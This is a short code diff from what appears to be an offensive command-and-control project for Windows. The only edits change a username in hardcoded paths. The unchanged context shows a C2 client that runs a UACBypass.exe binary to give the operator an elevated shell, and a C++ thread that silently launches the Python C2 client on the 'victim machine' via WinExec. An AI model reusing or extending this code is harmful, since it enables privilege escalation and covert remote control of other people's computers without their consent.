@@ -83,7 +83,7 @@ if ":bypassuac:" in data:
             else:
                 print("Attempting to bypassUAC now!")
                 proc = subprocess.Popen("C:/Users/public/UACBypass.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                #proc = subprocess.Popen(["c:/users/robbi/source/repos/UACBypass/x64/Debug/UACBypass.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                #proc = subprocess.Popen(["c:/users/g3tsyst3m/source/repos/UACBypass/x64/Debug/UACBypass.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 #client.send(b"returned output: \n"+proc.stdout.read())
                 time.sleep(2)
                 client.send(b"[+] Wrapping things up!  You should have an elevated shell soon!\n")
@@ -181,7 +181,7 @@ DWORD WINAPI ThreadProc(LPVOID lpParam) {
     // Command to be executed by WinExec
 	//You'll want to edit this to make sure the path lines up with your installation of python on the victim machine
 	//or better yet, compile this to an exe so you don't have to reference the python path :)
-    WinExec("c:\\users\\robbi\\AppData\\Local\\Programs\\Python\\Python313\\python.exe c:\\users\\public\\c2client_part3.py", 0);
+    WinExec("c:\\users\\g3tsyst3m\\AppData\\Local\\Programs\\Python\\Python313\\python.exe c:\\users\\public\\c2client_part3.py", 0);
     return 0;
 }
 
